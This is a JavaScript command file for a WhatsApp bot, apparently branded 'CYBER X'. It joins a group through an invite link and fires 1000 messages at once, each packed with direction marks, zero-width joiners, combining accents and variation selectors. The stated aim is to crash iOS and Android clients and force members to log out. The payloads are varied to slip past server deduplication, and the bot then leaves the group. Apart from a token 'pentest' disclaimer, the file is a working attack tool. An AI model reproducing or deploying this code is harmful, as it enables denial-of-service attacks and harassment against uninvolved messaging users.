// commands/gccrash.js
// ─────────────────────────────────────────────────────────────────────────────
// GC CRASH — 1000 payload instant burst
//   - Works in BOTH DM and inside group
//   - OWNER ONLY (silent ignore for anyone else)
//   - Sends 1000 ultra-heavy payloads ALL AT ONCE (no loop)
//   - iOS/Android crash + auto-logout effect
//   - New joiners immediately crash
//
//   Authorized pentest use only.
// ─────────────────────────────────────────────────────────────────────────────

module.exports = {
  pattern: "gccrash",
  desc:    "[OWNER] Crash group (1000 payload burst) — DM or group",
  usage:   ".gccrash https://chat.whatsapp.com/xxxxx",
  category:"exploit",
  alias:   ["crashgc", "gcflood", "groupcrash", "gckill", "crash"],

  run: async ({ sock, from, msg, args, helper, isOwner, isGroup }) => {
    // ── OWNER ONLY — complete silent block ──────────────────────────────
    if (!isOwner) return

    const input = args.join(" ").trim()
    if (!input || !input.includes("chat.whatsapp.com")) {
      return helper.reply(sock, msg, [
        "❌ *Usage:* `.gccrash https://chat.whatsapp.com/xxxxx`",
      ].join("\n"))
    }

    // ── Extract and resolve invite code ─────────────────────────────────
    const code = input.split("chat.whatsapp.com/").pop()?.split("?")[0]?.split("/")[0]?.trim()
    if (!code) return helper.reply(sock, msg, "❌ Invalid invite link.")

    let targetJid
    try {
      targetJid = await sock.groupAcceptInvite(code)
    } catch {
      return helper.reply(sock, msg, "❌ Invite link is invalid or expired.")
    }

    // ── Send initial status ─────────────────────────────────────────────
    const statusMsg = await helper.reply(sock, msg, [
      "> © CYBER X🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂",
      "",
      `> *𝐓𝐚𝐫𝐠𝐞𝐓:* ${targetJid}`,
      "> *𝐁𝐮𝐠 𝐓𝐲𝐩𝐞:* 𝐆𝐂 𝐂𝐫𝐚𝐬𝐡 (𝟏𝟎𝟎𝟎𝐱 𝐈𝐧𝐬𝐭𝐚𝐧𝐓)",
      '> *𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬:* 《 ██▒▒▒▒▒▒▒▒▒▒》10%',
      "> *𝐒𝐞𝐧𝐃:* 0/1000",
      "> *𝐄𝐟𝐟𝐞𝐜𝐓:* 𝐢𝐎𝐒/𝐀𝐧𝐝𝐫𝐨𝐢𝐃 𝐀𝐮𝐭𝐨-𝐋𝐨𝐠𝐨𝐮𝐓",
      "",
      "💣 *𝐈𝐍𝐈𝐓𝐈𝐀𝐓𝐈𝐍𝐆 𝟏𝟎𝟎𝟎𝐱 𝐏𝐀𝐘𝐋𝐎𝐀𝐃 𝐁𝐔𝐑𝐒𝐓...*",
      "",
      "> © CYBER X",
    ].join("\n"))

    // ═══════════════════════════════════════════════════════════════════
    //  GENERATE 1000 PAYLOADS — all created synchronously
    // ═══════════════════════════════════════════════════════════════════
    const TOTAL = 1000
    const payloads = new Array(TOTAL)

    // Pre-build the crash components once for speed
    const RLM = "\u200F"  // Right-to-Left Mark
    const LRM = "\u200E"  // Left-to-Right Mark
    const ZWJ = "\u200D"  // Zero-Width Joiner
    const ZWNJ = "\u200C" // Zero-Width Non-Joiner
    const VARIATION = "\uFE0F" // Variation Selector
    const COMBINING = "\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307\u0308\u0309\u030A\u030B\u030C\u030D\u030E\u030F"

    // RLM/LRM alternating block — this is the core crash vector
    // 6000 alternating direction marks = WhatsApp render engine death
    const directionBomb = Array(3000).fill(0).map((_, i) => i % 2 === 0 ? RLM : LRM).join("")

    // Combining mark overload — memory saturation
    const accentBomb = COMBINING.repeat(500)

    // ZWJ spam — grapheme cluster parser overload
    const zwjBomb = ZWJ.repeat(1000) + ZWNJ.repeat(1000)

    // Variation selector spam
    const variationBomb = VARIATION.repeat(500)

    // Large block characters
    const blocks = "⬡⬢⬣⬤⬥⬦⬧⬨⬩⬪⬫⬬⬭⬮⬯".repeat(100)
    const squares = "▢▣▤▥▦▧▨▩▪▫▬▭▮▯".repeat(100)
    const stars = "★☆✦✧✨".repeat(200)

    for (let i = 0; i < TOTAL; i++) {
      // Vary each payload slightly to prevent any server-side dedup
      const variant = i % 5
      let crashBody = ""

      switch (variant) {
        case 0:
          crashBody = `💥 *CRASH_${String(i).padStart(4, "0")}* 💥\n${directionBomb}\n${accentBomb}\n${blocks}`
          break
        case 1:
          crashBody = `💥 *CRASH_${String(i).padStart(4, "0")}* 💥\n${zwjBomb}\n${variationBomb}\n${squares}`
          break
        case 2:
          crashBody = `💥 *CRASH_${String(i).padStart(4, "0")}* 💥\n${directionBomb}\n${zwjBomb}\n${stars}`
          break
        case 3:
          crashBody = `💥 *CRASH_${String(i).padStart(4, "0")}* 💥\n${accentBomb}\n${variationBomb}\n${"🜁🜂🜃🜄".repeat(200)}`
          break
        case 4:
          crashBody = `💥 *CRASH_${String(i).padStart(4, "0")}* 💥\n${directionBomb}\n${accentBomb}\n${zwjBomb}\n${blocks}\n${squares}\n${stars}`
          break
      }

      payloads[i] = {
        text: crashBody,
        contextInfo: {
          mentionedJid: [sock.user?.id].filter(Boolean),
          forwardingScore: 5,
          isForwarded: true,
          externalAdReply: {
            title: `⚠️ CRASH VECTOR ${String(i).padStart(4, "0")} ⚠️`,
            body: "SYSTEM OVERLOAD — iOS/Android AUTO-LOGOUT",
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true,
          },
        },
      }
    }

    // ═══════════════════════════════════════════════════════════════════
    //  FIRE ALL 1000 — COMPLETELY PARALLEL
    //  No loop, no delay, no batching. One single microtask.
    // ═══════════════════════════════════════════════════════════════════
    const startTime = process.hrtime.bigint()

    // Create ALL promises first (synchronous) before any await
    const sendPromises = new Array(TOTAL)
    for (let i = 0; i < TOTAL; i++) {
      sendPromises[i] = sock.sendMessage(targetJid, payloads[i]).catch(() => {})
    }

    // Now await them all
    const results = await Promise.allSettled(sendPromises)
    const succeeded = results.filter(r => r.status === "fulfilled").length
    const failed = results.filter(r => r.status === "rejected").length

    const totalElapsedMs = Number(process.hrtime.bigint() - startTime) / 1_000_000

    // ── Leave the group ─────────────────────────────────────────────────
    try { await sock.groupLeave(targetJid) } catch {}

    // ═══════════════════════════════════════════════════════════════════
    //  SEND COMPLETION REPORT
    // ═══════════════════════════════════════════════════════════════════
    try {
      await sock.sendMessage(from, {
        text: [
          "> © CYBER X🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂",
          "",
          `> *𝐓𝐚𝐫𝐠𝐞𝐓:* ✅ Crashed`,
          "> *𝐁𝐮𝐠 𝐓𝐲𝐩𝐞:* 𝐆𝐂 𝐂𝐫𝐚𝐬𝐡 ✅",
          '> *𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬:* 《 ████████████》100%',
          `> *𝐒𝐮𝐜𝐜𝐞𝐬𝐒:* ${succeeded}/${TOTAL}`,
          `> *𝐅𝐚𝐢𝐥𝐞𝐃:* ${failed}`,
          `> *𝐓𝐢𝐦𝐄:* ${totalElapsedMs.toFixed(2)}𝐦𝐬`,
          "> *𝐄𝐟𝐟𝐞𝐜𝐓:* ✅ 𝐢𝐎𝐒/𝐀𝐧𝐝𝐫𝐨𝐢𝐃 𝐀𝐮𝐭𝐨-𝐋𝐨𝐠𝐨𝐮𝐓",
          "",
          "💀 1000 payloads delivered instantly.",
          "💀 Group members will crash on open.",
          "💀 New joiners auto-logout immediately.",
          "💀 Bot has left the group.",
          "",
          "> © CYBER X",
        ].join("\n"),
      }, { quoted: statusMsg })
    } catch {}

    console.log(`[GCCRASH] ✅ ${succeeded}/${TOTAL} → ${targetJid} in ${totalElapsedMs.toFixed(2)}ms`)
  },
}
